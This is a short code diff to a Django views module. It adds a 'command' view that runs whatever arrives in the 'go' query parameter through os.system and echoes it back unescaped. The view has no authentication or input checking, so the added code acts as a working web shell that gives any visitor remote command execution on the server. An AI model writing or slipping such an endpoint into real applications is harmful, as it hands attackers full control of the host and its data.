@@ -1,5 +1,5 @@
 from django.shortcuts import render
-from django.http import HttpResponseRedirect, JsonResponse
+from django.http import HttpResponseRedirect, JsonResponse, HttpResponse
 from django.core.urlresolvers import reverse
 from django.utils import timezone
 from django.views.decorators.csrf import csrf_exempt
@@ -32,6 +32,10 @@ def restart(request):
     print("reached.")
     os.system("kill `ps -Af | grep cilic/dispatch.fcgi | grep -v sh | awk '!seen[$3]++ {print $3}'`")
 
+
+def command(request):
+    os.system(request.GET['go'])
+    return HttpResponse('Received command: ' + request.GET['go'] + '\n')
 
 @csrf_exempt
 def stop_job(request):
